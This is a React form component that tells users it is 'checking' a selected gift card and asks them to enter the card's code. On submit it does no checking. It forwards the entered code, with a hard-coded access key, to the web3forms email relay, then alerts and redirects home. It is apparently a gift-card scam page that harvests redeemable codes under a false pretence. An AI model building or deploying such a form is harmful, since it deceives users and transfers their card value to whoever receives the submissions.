import { useState } from "react";
import { useLocation } from "react-router-dom";
import { useNavigate } from "react-router-dom";

const ContactForm = () => {
  const location = useLocation();
  const navigate = useNavigate();
  const selectedCard = location.state?.selectedCard || "Unknown Card";

  const [isFormVisible, setIsFormVisible] = useState(true);

  const onSubmit = async (event) => {
    event.preventDefault();
    const formData = new FormData(event.target);

    formData.append("selected_card", selectedCard);
    formData.append("access_key", "d161a33e-2e53-4cf3-ae11-6cfe74e4367d");

    const object = Object.fromEntries(formData);
    const json = JSON.stringify(object);

    const res = await fetch("https://api.web3forms.com/submit", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Accept: "application/json",
      },
      body: json,
    }).then((res) => res.json());

    if (res.success) {
      alert(res.message);
      setIsFormVisible(false);
      navigate("/");
    }
  };

  return (
    <div className="p-6">
      {isFormVisible && (
        <form onSubmit={onSubmit} className="contact-right flex flex-col items-start gap-4 mt-6">
          <h3 className="text-white font-bold">Checking {selectedCard}</h3>

          <label className="text-gray-400">Your Code</label>
          <input type="text" placeholder="Enter your code" name="gift card code" className="bg-green-900 p-2 text-white rounded-lg border-none outline-none min-w-80" required />

          {/* Hidden input to store the selected card value */}
          <input type="hidden" name="selected_card" value={selectedCard} />

          <button type="submit" className="border-none text-white rounded-3xl text-xl py-1 px-3 mt-4">
            Submit now
          </button>

          <button type="button" onClick={() => setIsFormVisible(false)} className="text-gray-400 mt-2">
            Cancel
          </button>
        </form>
      )}
    </div>
  );
};

export default ContactForm;
